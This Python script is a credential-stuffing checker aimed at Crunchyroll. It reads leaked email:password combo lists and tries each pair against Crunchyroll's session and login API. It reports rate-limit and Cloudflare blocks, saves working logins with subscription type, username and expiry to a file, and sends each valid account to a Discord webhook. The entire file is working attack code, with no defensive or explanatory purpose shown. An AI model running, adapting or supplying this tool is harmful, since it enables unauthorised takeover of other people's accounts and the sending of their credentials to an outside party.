import requests
import json
import tkinter as tk
import requests
import sys
from discord_webhook import DiscordWebhook, DiscordEmbed
import json
from colorama import init, Fore
from bs4 import BeautifulSoup
init(autoreset=True)
red = Fore.RED
blue = Fore.BLUE
white = Fore.WHITE
webhookurl = ""
proxyl = []
with open("Accounts/lekiAccountChecker/combos.txt", 'r') as combos:
    combos = combos.read().splitlines()
with open("Accounts/lekiAccountChecker/proxies.txt", "r") as proxies:
    proxies = proxies.read().splitlines()

print(len(combos))
sp = ""
debug = False
proxyless = True
iscapture = False


def delete_last_line():
    sys.stdout.write('\x1b[1A')
    sys.stdout.write('\x1b[2K')


def logo():
    print(f"""
    _             _               _
    | |           | |             | |
    | | ___    ___| |__   ___  ___| | _____ _ __
    | |/ _ \  / __| '_ \ / _ \/ __| |/ / _ \ '__|
    | |  __/ | (__| | | |  __/ (__|   <  __/ |
    |_|\___|  \___|_| |_|\___|\___|_|\_\___|_|
    Proxyless = {proxyless}
    Webhook = {webhookurl}
    """)


def comboextm():
    return


def crunchycheck():
    logo()
    for i in range(len(combos)):

        if iscapture == True:
            remove_capture = combos[i].split(" ")[0]
            line = remove_capture.split(":")
        if iscapture == False:
            line = combos[i].split(":")
        email = line[0]
        password = line[1]
        r = requests.post('https://api.crunchyroll.com/start_session.0.json', data={'version': '1.0', 'access_token': 'LNDJgOit5yaRIWN',
                                                                                    'device_type': 'com.crunchyroll.windows.desktop', 'device_id': 'AYS0igYFpmtb0h2RuJwvHPAhKK6RCYId', 'account': email, 'password': password})
        soup = BeautifulSoup(r.text, 'lxml')
        title = soup.find('p')
        if debug == True:
            print(r.text)
        try:
            if title.get_text() == "The owner of this website (api.crunchyroll.com) has banned you temporarily from accessing this website.":
                print(f"[{i}]Rate limit exceeded")
            if soup.find('h1').get_text() == "Please turn JavaScript on and reload the page.":
                print(f"[{i}]Your screwed on cloudflare")
        except Exception:
            pass
        if "session_id" in r.text:
            cookies = json.loads(r.text)
            coodata = cookies["data"]
            coodata = coodata["session_id"]
            r = requests.post('https://api.crunchyroll.com/login.0.json', data={
                'account': email, 'password': password, 'session_id': coodata})

            info = json.loads(r.text)
            if info["code"] == "ok":
                data = info["data"]
                userdata = data["user"]
                expire = data["expires"]
                name = userdata["username"]
                subscription = userdata["access_type"]
                yes = f"[{i}VALID] {email}:{password} | Subscription: {subscription}, Username: {name}, Expires: {expire}"
                print(yes)
                with open("Accounts/lekiAccountChecker/valid/valid.txt", "a") as write:
                    write = write.writelines(yes + "\n")
                webhook = DiscordWebhook(url=webhookurl, content="")
                embed = DiscordEmbed(
                    title="Valid Crunchyroll", description=yes)
                embed.set_thumbnail(
                    url="https://upload.wikimedia.org/wikipedia/commons/0/08/Crunchyroll_Logo.png")
                embed.set_footer(
                    text="Made by leki#6796", icon_url="https://upload.wikimedia.org/wikipedia/commons/")
                embed.set_timestamp()
                webhook.add_embed(embed)
                webhook.execute()

            else:
                if info["message"] == "Incorrect login information.":
                    print(f"[{i}X] Incorrect login information.")
                    if debug == True:
                        print(f"login - {email}:{password}")
                else:
                    if debug == False:
                        print(
                            "Unknown error occured enable debugging to see the raw issue")
                    if debug == True:
                        print(r.text)
                        webhook = DiscordWebhook(
                            url=webhookurl, rate_limit_retry=True, content=r.text)
                        response = webhook.execute()


crunchycheck()
